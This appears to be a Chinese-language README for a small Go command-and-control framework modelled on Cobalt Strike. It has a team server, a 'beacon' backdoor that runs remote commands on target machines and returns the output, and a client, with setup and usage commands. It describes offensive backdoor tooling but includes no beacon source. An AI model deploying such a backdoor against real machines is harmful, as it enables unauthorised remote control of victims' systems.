[toc]

# 0. 概述

一个用Go实现的简易C2。

目录结构：

* server：相当于cs teamserver；

* beacon：模仿cs命名的后门，负责接收并执行命令，并回传执行结果；

* client：相当于cs客户端；

# 1. 环境

1. Go，注意要把 `%GOPATH%/bin` 添加到PATH环境变量；
2. [Protobuf](https://developers.google.cn/protocol-buffers)：
	* [快速入门](https://developers.google.cn/protocol-buffers/docs/gotutorial)，
	* [编译器下载](https://github.com/protocolbuffers/protobuf/releases) 
	* Go 插件，%GOPATH%/bin/protoc-gen-go.exe:

```
go get -u github.com/golang/protobuf/protoc-gen-go
```

如果没有exe生成，就在 /protoc-gen-go包目录里手动编译：

```
go build -o protoc-gen-go main.go
```



# 2. 使用

## 定义接口

在grpapi目录下执行以下命令编译beacon.proto，生成 /grpaapi/beacon.pb.go：

```
protoc -I . --go_out=plugins=grpc:./ ./beacon.proto
```

生成的beacon.pb.go里有我们需要实现的服务接口，如：

```go
// beaconServer is the server API for beacon service.
type beaconServer interface {
	FetchCommand(context.Context, *Empty) (*Command, error)
	SendOutput(context.Context, *Command) (*Empty, error)
}
```



## 启动服务

共两个服务，所以要指定两个端口：

* BeaconServer，与目标机器beacon连接；
* AdminServer，与客户端连接；

```shell
example:  
> go run .\server\server.go -server localhost -clientport 4444 -beaconport 5555
-beaconport uint
        team server port for beacon
-clientport uint
        team server port for client
-server string
        team server ip
```

## 执行beacon

```shell
 go run .\beacon.go -server localhost -port 5555
```

## 启动客户端

目前每次启动仅能执行一条命令：

```shell
go run .\client.go -server localhost -port 4444 -cmd "whoami"
```




# 3. 已知问题

* 编码问题；

* 如果执行结果太长，比如ipconfig /all，返回结果（SendResult）会失败；

